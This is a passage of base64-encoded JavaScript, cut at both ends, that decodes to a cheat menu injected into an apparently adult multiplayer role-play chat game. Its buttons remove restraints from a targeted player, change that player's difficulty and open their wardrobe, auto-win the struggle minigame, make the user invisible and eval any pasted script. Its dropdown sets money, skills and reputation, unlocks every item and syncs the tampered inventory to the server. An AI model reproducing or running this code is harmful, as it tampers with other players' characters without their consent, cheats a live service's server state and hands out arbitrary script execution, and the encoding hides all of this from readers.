9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uMyA9IGNyZWF0ZUJ1dHRvbigiRnJlZSBUYXJnZXQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6Q2hhcmFjdGVyUmVsZWFzZVRvdGFsKEN1cnJlbnRDaGFyYWN0ZXIpLENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjQgPSBjcmVhdGVCdXR0b24oIlJlbW92ZSBSZXN0cmFpbnQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5VW5sb2NrKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIEludmVudG9yeVJlbW92ZShDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjUgPSBjcmVhdGVCdXR0b24oIlRhcmdldCBTdHJ1Z2dsZSBEaWZmaWN1bHR5IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OmRve3ZhciBkaWZjPXByb21wdCgnRGlmZmljdWx0eVx4MjAxLTk2Jyk7fXdoaWxlKCEoZGlmYz49MHgxJiZkaWZjPD0weDYwKSk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSGVhZCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgyIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQXJtcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhhbmRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTGVncyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUV5ZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1GZWV0IiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRGV2aWNlcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUFkZG9uIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVjayIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2tSZXN0cmFpbnRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVja0FjY2Vzc29yaWVzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQm9vdHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Ib29kIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTm9zZSIsIGRpZmMpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoQ3VycmVudENoYXJhY3Rlcik7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNiA9IGNyZWF0ZUJ1dHRvbigiT3BlbiBUYXJnZXQgV2FyZHJvYmUiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6RGlhbG9nQ2hhbmdlQ2xvdGhlcygpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjcgPSBjcmVhdGVCdXR0b24oIkNvbXBsZXRlIFN0cnVnZ2xlIE1pbmlnYW1lIiwgZnVuY3Rpb24oKSB7CiAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIGphdmFzY3JpcHQ6U3RydWdnbGVQcm9ncmVzcyA9MTAwMDsKICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICBEaWFsb2dMZWF2ZSgpOwogICAgfSwgNTAwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7Cgp2YXIgYnV0dG9uOCA9IGNyZWF0ZUJ1dHRvbigiSW52aXNpYmxlIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICBIZWlnaHQ6ICItIgogICAgICB9OwogICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsgCiAgICAgIHZpc2IgPSBmYWxzZTsKICAgICAgc2hvd1RvYXN0c2NwZygpOwogICAgICB1cGRhdGVDb250ZXh0TWVudSgpOyAKCiAgICAKfSk7Cgp2YXIgYnV0dG9uOSA9IGNyZWF0ZUJ1dHRvbigiVmlzaWJsZSIsIGZ1bmN0aW9uKCkgewogIGphdmFzY3JpcHQ6Q2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIHZpc2IgPSB0cnVlOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgdXBkYXRlQ29udGV4dE1lbnUoKTsgCiAgCn0pOwoKdmFyIGJ1dHRvbjEwID0gY3JlYXRlQnV0dG9uKCJDdXN0b20gU2NyaXB0IiwgZnVuY3Rpb24oKSB7CiAgamF2YXNjcmlwdDp2YXIgc2NycCA9IHByb21wdCgiUGFzdGUgeW91ciBzY3JpcHQgaGVyZToiKTsKICBpZiAoc2NycCkgewogICAgZXZhbChzY3JwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICB9Cn0pOwovLyBUcmFuc2l0aW9uIHN0eWxpbmcgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24yLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMy5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjQuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b241LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNi5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjcuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b244LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uOS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjEwLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKCgoKLy9Ib3ZlciBldmVudHMgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CiAgICB0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKICAgIHRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwogICAgfSk7CmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKICAgIHRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7CiAgICB9KTsKCmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwLjVweCI7Cn0pOwpidXR0b243LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24xMC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMTAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgovL0Ryb3Bkb3duIE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmZ1bmN0aW9uIGZvcmNlY2xvc2VtZW51KCkgewogIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgaWYgKFBsYXllci5MYXN0Q2hhdFJvb20gIT09ICcnKSB7CiAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgfQogIERpYWxvZ0xlYXZlKCk7CiAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7Cn0KCiAvLyBEcm9wZG93biBtZW51CnZhciBzZWxlY3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzZWxlY3QiKTsKc2VsZWN0LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIycHgiOwpzZWxlY3Quc3R5bGUucGFkZGluZyA9ICI0cHgiOwpzZWxlY3Quc3R5bGUud2lkdGggPSAiMjAwcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luVG9wID0gIi0yMHB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpblJpZ2h0ID0gIjJweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiM3B4IjsKc2VsZWN0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMnB4IjsKdmFyIG9wdGlvbjEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMS52YWx1ZSA9ICJvcHQxIjsKb3B0aW9uMS50ZXh0ID0gIlBlcnNvbmFsaXNhdGlvbiBNZW51IjsKb3B0aW9uMS5zZWxlY3RlZCA9IHRydWU7Cm9wdGlvbjEuZGlzYWJsZWQgPSB0cnVlOwp2YXIgb3B0aW9uMiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24yLnZhbHVlID0gIm9wdDIiOwpvcHRpb24yLnRleHQgPSAiRWRpdCBDYXNoIjsKdmFyIG9wdGlvbjMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMy52YWx1ZSA9ICJvcHQzIjsKb3B0aW9uMy50ZXh0ID0gIk1heCBTa2lsbHMiOwp2YXIgb3B0aW9uNCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb240LnZhbHVlID0gIm9wdDQiOwpvcHRpb240LnRleHQgPSAiTWF4IFJlcHV0YXRpb24iOwp2YXIgb3B0aW9uNSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb241LnZhbHVlID0gIm9wdDUiOwpvcHRpb241LnRleHQgPSAiUHVyY2hhc2UgRXZlcnl0aGluZyI7CnZhciBvcHRpb242ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjYudmFsdWUgPSAib3B0NiI7Cm9wdGlvbjYudGV4dCA9ICJSZWxlYXNlIE93bmVyIENvbGxhciI7CnZhciBvcHRpb243ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjcudmFsdWUgPSAib3B0NyI7Cm9wdGlvbjcudGV4dCA9ICIrMSBMQVJQIExldmVsIjsKdmFyIG9wdGlvbjggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uOC52YWx1ZSA9ICJvcHQ4IjsKb3B0aW9uOC50ZXh0ID0gIkJlY29tZSBFc2NhcGVkIFBhdGllbnQiOwp2YXIgb3B0aW9uOSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb245LnZhbHVlID0gIm9wdDkiOwpvcHRpb245LnRleHQgPSAiQmVjb21lIENsdWIgU2xhdmUiOwp2YXIgb3B0aW9uMTAgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTAudmFsdWUgPSAib3B0MTAiOwpvcHRpb24xMC50ZXh0ID0gIlJlbGVhc2UgQ2x1YiBUaXRsZSI7CnZhciBvcHRpb24xMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMS52YWx1ZSA9ICJvcHQxMSI7Cm9wdGlvbjExLnRleHQgPSAiU2V0IEdHVFMgTGV2ZWwiOwp2YXIgb3B0aW9uMTIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTIudmFsdWUgPSAib3B0MTIiOwpvcHRpb24xMi50ZXh0ID0gIlNldCBEb20vU3ViIExldmVsIjsKdmFyIG9wdGlvbjEzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEzLnZhbHVlID0gIm9wdDEzIjsKb3B0aW9uMTMudGV4dCA9ICJTZXQgTmlja25hbWUiOwp2YXIgb3B0aW9uMTQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTQudmFsdWUgPSAib3B0MTQiOwpvcHRpb24xNC50ZXh0ID0gIkZvcmNlIE9yZ2FzbSI7CnZhciBvcHRpb24xNSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNS52YWx1ZSA9ICJvcHQxNSI7Cm9wdGlvbjE1LnRleHQgPSAiQkNNIERpc2NvcmQiOwp2YXIgb3B0aW9uMTYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTYudmFsdWUgPSAib3B0MTYiOwpvcHRpb24xNi50ZXh0ID0gIkZvcmNlIExvYmJ5IjsKdmFyIG9wdGlvbjE3ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE3LnZhbHVlID0gIm9wdDE3IjsKb3B0aW9uMTcudGV4dCA9ICJMQVJQIE9wdGlvbnMiOwp2YXIgb3B0aW9uMTggPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTgudmFsdWUgPSAib3B0MTgiOwpvcHRpb24xOC50ZXh0ID0gIkVtb3RlIE1lbnUgKGAgKyBFKSI7CnZhciBvcHRpb24xOSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xOS52YWx1ZSA9ICJvcHQxOSI7Cm9wdGlvbjE5LnRleHQgPSAiUGVyc2lzdGFudCBTZXR0aW5ncyAoYCArIFMpIjsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24zKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjQpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTIpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb242KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjcpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uOCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb245KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEwKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjExKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjEzKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE0KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE2KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE3KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE4KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE5KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjE1KTsKCgoKLy8gQnV0dG9uIHRvIHNob3cgdGhlIGRyb3Bkb3duIG1lbnUKdmFyIGRyb3Bkb3duQnV0dG9uID0gY3JlYXRlQnV0dG9uKCJQZXJzb25hbGlzYXRpb24iLCBmdW5jdGlvbigpIHsKICBzZWxlY3Quc3R5bGUuZGlzcGxheSA9ICJibG9jayI7Cn0pOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5vcGFjaXR5ID0gIjAiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5wb2ludGVyRXZlbnRzID0gIm5vbmUiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnRvcCA9ICItOTk5OXB4IjsKZHJvcGRvd25CdXR0b24uc3R5bGUubGVmdCA9ICItOTk5OXB4IjsKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsgCn0pOwoKc2VsZWN0LmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIHZhciBzZWxlY3RlZE9wdGlvbiA9IHNlbGVjdC5vcHRpb25zW3NlbGVjdC5zZWxlY3RlZEluZGV4XS52YWx1ZTsKICBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxIikgewogICAgamF2YXNjcmlwdDpQbGF5ZXIuTW9uZXkgPSA5OTk5OTk5CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTsKICAgIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MiIpIHsKICAgIGphdmFzY3JpcHQ6UGxheWVyLk1vbmV5ID0gcHJvbXB0KCJFbnRlciBDYXNoIEFtb3VudCIpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MyIpIHsKICAgIGphdmFzY3JpcHQ6U2tpbGxDaGFuZ2UoIkluZmlsdHJhdGlvbiIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJTZWxmQm9uZGFnZSIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJXaWxscG93ZXIiLCAxMCk7CiAgICBTa2lsbENoYW5nZSgiRXZhc2lvbiIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJCb25kYWdlIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIkRyZXNzYWdlIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIkxvY2tQaWNraW5nIiwgMTApOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NCIpIHsKICAgIGphdmFzY3JpcHQ6UmVwdXRhdGlvbkNoYW5nZSgiR2FtaW5nIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkdhbWJsaW5nIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkxBUlAiLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTWFpZCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJBQkRMIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIk51cnNlIiwgMTAwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDUiKSB7CiAgICBqYXZhc2NyaXB0OlNlcnZlclBsYXllclN5bmMKICAgIEFzc2V0RmVtYWxlM0RDRy5mb3JFYWNoKGdyb3VwPT5ncm91cC5Bc3NldC5mb3JFYWNoKGl0ZW09PkludmVudG9yeUFkZChQbGF5ZXIsIGl0ZW0uTmFtZSwgZ3JvdXAuR3JvdXApKSk7CiAgICBTZXJ2ZXJQbGF5ZXJJbnZlbnRvcnlTeW5jKCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ2IikgewogICAgamF2YXNjcmlwdDpJbnZlbnRvcnlSZW1vdmUoUGxheWVyLCAiSXRlbU5lY2siKTsKICAgIENoYXRSb29tQ2hhcmFjdGVySXRlbVVwZGF0ZShQbGF5ZXIsICJJdGVtTmVjayIpOwogICAgTG9nQWRkKCJSZWxlYXNlZENvbGxhciIsICJPd25lclJ1bGUiKTsgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ3IikgewogICAgamF2YXNjcmlwdDphbGVydCgnU3RhcnQgYSBMQVJQIHNlc3Npb24gJiBzZWxlY3QgY2xhc3MgYmVmb3JlIHJ1bm5pbmcnKTsKICAgIEdhbWVMQVJQTGV2ZWxQcm9ncmVzcygxMDApIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OCIpIHsKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJFc2NhcGVkIiwgIkFzeWx1bSIsIEN1cnJlbnRUaW1lICsgOTk5OTk5OTk5KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDkiKSB7CiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiQ2x1YlNsYXZlIiwgIk1hbmFnZW1lbnQiLCBDdXJyZW50VGltZSArIDk5OTk5OTk5O